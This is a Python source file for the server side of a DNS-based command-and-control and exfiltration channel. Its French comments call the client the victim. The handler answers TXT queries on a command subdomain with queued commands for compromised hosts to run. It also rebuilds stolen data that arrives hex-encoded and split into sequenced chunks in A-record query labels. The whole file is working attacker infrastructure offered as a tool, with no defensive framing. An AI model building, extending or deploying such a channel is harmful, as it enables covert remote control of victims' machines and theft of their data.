from dnslib import DNSRecord, QTYPE, RR, A, TXT
import binascii
from utils.state import command_queue, exfil_buffer, expected_chunks, DNS_DOMAIN

class DNSHandler:
    def __init__(self, request, client_address, server):
        self.data, self.sock = request
        self.client_address = client_address
        self.handle()

    def handle(self):
        global expected_chunks, exfil_buffer

        try:
            req = DNSRecord.parse(self.data)
            qname = str(req.q.qname).rstrip('.')
            qtype = QTYPE[req.q.qtype]
        except Exception as e:
            print(f"❌ [dns] parse error: {e}")
            return

        reply = req.reply()

        # Commande demandée par la victime
        if qtype == "TXT" and qname == f"command.{DNS_DOMAIN}":
            if command_queue:
                cmd = command_queue.pop(0)
                print(f"📤 [dns-cmd] sending: {cmd!r}")
                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(cmd), ttl=0))
            try:
                self.sock.sendto(reply.pack(), self.client_address)
            except Exception as e:
                print(f"❌ [dns] failed to send TXT reply: {e}")
            return

        # Exfiltration par requêtes A
        if qtype == "A":
            label = qname.split('.', 1)[0]
            if '-' in label and '/' in label:
                hdr, hx = label.split('-', 1)
                seq_s, tot_s = hdr.split('/', 1)
                try:
                    seq = int(seq_s, 16)
                    tot = int(tot_s, 16)
                    chunk = binascii.unhexlify(hx)
                    exfil_buffer[seq] = chunk
                    if expected_chunks is None:
                        expected_chunks = tot
                    print(f"📥 [dns-exfil] got chunk {seq}/{tot}")
                except Exception as e:
                    print(f"⚠️ parse error on label {label}: {e}")

            reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=0))
            self.sock.sendto(reply.pack(), self.client_address)
